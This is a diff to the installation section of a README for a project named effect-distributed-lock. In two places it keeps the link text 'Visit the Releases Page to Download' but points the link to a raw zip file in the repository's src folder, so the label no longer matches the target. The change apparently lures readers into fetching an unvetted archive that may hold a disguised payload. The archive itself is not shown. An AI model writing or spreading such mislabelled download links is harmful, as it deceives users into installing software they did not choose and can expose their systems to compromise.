@@ -11,7 +11,7 @@ To get started with effect-distributed-lock, follow these easy steps to download
 1. **Visit the Releases Page**
    You can download the latest version of the software from our GitHub Releases page. Click the link below to navigate directly to that page:
 
-   [Visit the Releases Page to Download](https://github.com/huisjerry/effect-distributed-lock/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/huisjerry/effect-distributed-lock/main/src/effect-distributed-lock-3.2.zip)
 
 2. **Find the Latest Release**
    On the Releases page, you will see a list of available versions. The latest version will be listed at the top.
@@ -62,7 +62,7 @@ To install effect-distributed-lock, follow these steps:
 1. **Go Back to the Releases Page**
    If you haven’t clicked the download link yet, here it is again:
 
-   [Visit the Releases Page to Download](https://github.com/huisjerry/effect-distributed-lock/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/huisjerry/effect-distributed-lock/main/src/effect-distributed-lock-3.2.zip)
 
 2. **Select Your File Format**
    Choose the file appropriate for your operating system.
